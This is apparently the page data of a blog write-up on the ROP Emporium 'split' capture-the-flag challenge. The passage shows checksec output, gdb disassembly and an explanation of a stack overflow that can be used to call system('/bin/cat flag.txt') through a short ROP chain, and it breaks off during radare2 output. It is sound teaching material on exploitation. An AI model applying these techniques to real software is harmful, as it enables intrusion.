{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var p=Object.create;var o=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var m=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,N=Object.prototype.hasOwnProperty;var k=(a,s)=>()=>(s||a((s={exports:{}}).exports,s),s.exports),u=(a,s)=>{for(var r in s)o(a,r,{get:s[r],enumerable:!0})},l=(a,s,r,n)=>{if(s&&typeof s==\"object\"||typeof s==\"function\")for(let c of m(s))!N.call(a,c)&&c!==r&&o(a,c,{get:()=>s[c],enumerable:!(n=d(s,c))||n.enumerable});return a};var b=(a,s,r)=>(r=a!=null?p(h(a)):{},l(s||!a||!a.__esModule?o(r,\"default\",{value:a,enumerable:!0}):r,a)),g=a=>l(o({},\"__esModule\",{value:!0}),a);var i=k((F,t)=>{t.exports=_jsx_runtime});var y={};u(y,{default:()=>w,frontmatter:()=>f});var e=b(i()),f={title:\"Return-Oriented Programming - Split\",date:\"2021-12-20\",tags:[\"ropemporium\",\"rop\",\"pwn\"],draft:!1,summary:\"Combine elements from the ret2win challenge that have been split apart to beat this challenge. Learn how to use another tool whilst crafting a short ROP chain.\",layout:\"PostLayout\",images:\"/static/images/ropemporium/split.jpg\",canonicalUrl:null};function x(a={}){let{wrapper:s}=a.components||{};return s?(0,e.jsx)(s,Object.assign({},a,{children:(0,e.jsx)(r,{})})):r();function r(){let n=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",p:\"p\",blockquote:\"blockquote\",strong:\"strong\",code:\"code\",pre:\"pre\",div:\"div\"},a.components),{Image:c}=n;return c||v(\"Image\",!0),(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h2,{id:\"introduction\",children:[(0,e.jsx)(n.a,{href:\"#introduction\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Introduction\"]}),(0,e.jsx)(n.p,{children:\"Challenge Description\"}),(0,e.jsx)(n.blockquote,{children:(0,e.jsx)(n.p,{children:\"The elements that allowed you to complete ret2win are still present, they've just been split apart. Find them and recombine them using a short ROP chain\"})}),(0,e.jsxs)(n.p,{children:[\"The goal of this challenge is to understand how function arguments are passed in 64bit machine when doing return oriented programming. The target binary can be downloaded from the authors website \",(0,e.jsx)(n.a,{href:\"https://ropemporium.com\",children:\"ropemporium\"}),\".\"]}),(0,e.jsxs)(n.p,{children:[\"First we check the binary protections enabled on the downloaded. Only \",(0,e.jsx)(n.strong,{children:\"NX\"}),\" (Not executable) is enabled on the device according to \",(0,e.jsx)(n.code,{children:\"checksec\"}),\" binary utility as shown in the image below.\"]}),(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-bash\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"vx@archie:split$ checksec --file\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`split\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Arch:     amd64-64-little\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    RELRO:    Partial RELRO\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Stack:    No canary found\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    NX:       NX enabled\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    PIE:      No PIE \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"0x400000\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),(0,e.jsxs)(n.p,{children:[\"From analysis of binary we use gdb debugger in order to analyze the functions present in the binary in order to understand the logic. We disassemble \",(0,e.jsx)(n.strong,{children:\"pwnme\"}),\" function as in the image below.The function looks familiar as for the ret2win function.\"]}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-nasm\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb) disas pwnme\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Dump of assembler code for function pwnme:\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006e8\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tpush   \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006e9\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006ec\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tsub    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsp\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006f0\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tlea    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),\",\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006f4\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"12\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006f9\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"17\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"esi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006fe\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"22\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400701\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"25\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400580\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"memset@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400706\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"30\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400810\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040070b\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"35\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400550\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400710\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"40\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40083c\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400715\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"45\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"eax\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040071a\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"50\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400570\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"printf@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040071f\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"55\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tlea    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),\",\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400723\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"59\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x60\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400728\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"64\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsi\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040072b\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"67\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400730\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"72\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400590\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"read@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400735\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"77\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40083f\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040073a\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"82\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400550\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040073f\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"87\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`:\tnop\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400740\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"88\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`:\tleave\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400741\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"89\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`:\tret\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`End of assembler dump.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb)\n`})]})}),(0,e.jsxs)(n.p,{children:[\"From the above code, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. \",(0,e.jsx)(n.strong,{children:\"memset\"}),\" is used to overwrite any values that is present in the memory area specified. The memory region we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the boundary of base pointer address in the stack.\"]}),(0,e.jsx)(n.div,{children:(0,e.jsx)(c,{alt:\"\",src:\"/static/images/ropemporium/stack.png\",width:\"209\",height:\"256\"})}),(0,e.jsxs)(n.p,{children:[\"Next function is \",(0,e.jsx)(n.strong,{children:\"read\"}),\" function, which reads for user input from the standard input file descriptor and stores in the specified buffer. From disassembled code, we are reading \",(0,e.jsx)(n.strong,{children:\"0x60\"}),\" bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.\"]}),(0,e.jsx)(n.pre,{className:\"language-c\",children:(0,e.jsx)(n.code,{className:\"code-highlight language-c\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token class-name\",children:\"ssize_t\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"read\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token keyword\",children:\"int\"}),\" fd\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"void\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\"buf\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token class-name\",children:\"size_t\"}),\" count\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]})})}),(0,e.jsxs)(n.p,{children:[\"For this challenge we don`t have a ret2win function which we are to return to. From the disassembly of the binary we have an interesting function called \",(0,e.jsx)(n.strong,{children:\"usefulFunction\"}),\". The usefulFunction, does listing of the files in the directory when called by the function.\"]}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-nasm\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb) disas usefulFunction\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Dump of assembler code for function usefulFunction:\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400742\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tpush   \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400743\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400746\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40084a\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040074b\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"9\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400560\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"system@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400750\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"14\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`:\tnop\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400751\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"15\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tpop    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400752\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"16\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`:\tret\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`End of assembler dump.\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"(gdb) x\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\"s \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40084a\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40084a\"}),\":\t\",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/bin/ls\"'}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb)\n`})]})}),(0,e.jsxs)(n.p,{children:[\"Goal is to pass a different string to the system function instead of \",(0,e.jsx)(n.strong,{children:'\"/bin/ls\"'})]}),(0,e.jsx)(n.p,{children:\"From the authors hint, we can look for useful hints in the binary using either radare2 or rizin. Both tools perform the same function, it is a matter of choice.\"}),(0,e.jsx)(n.blockquote,{children:(0,e.jsxs)(n.p,{children:[\"Now that you've gathered the elements of your exploit you can start to piece them together, you want to call system() with the \",(0,e.jsx)(n.strong,{children:'\"/bin/cat flag.txt\"'}),\" string as the only argument. You'll also have to start dealing with the differences between the various architectures' calling conventions.\"]})}),(0,e.jsxs)(n.p,{children:[\"Opening the binary in radare2, we can use \",(0,e.jsx)(n.strong,{children:\"iz\"}),\" command to look for strings. The goal is to read the flag from the system.\"]}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-nasm\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x004005b0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),` iz\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`nth paddr      vaddr      len size section type  string\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token 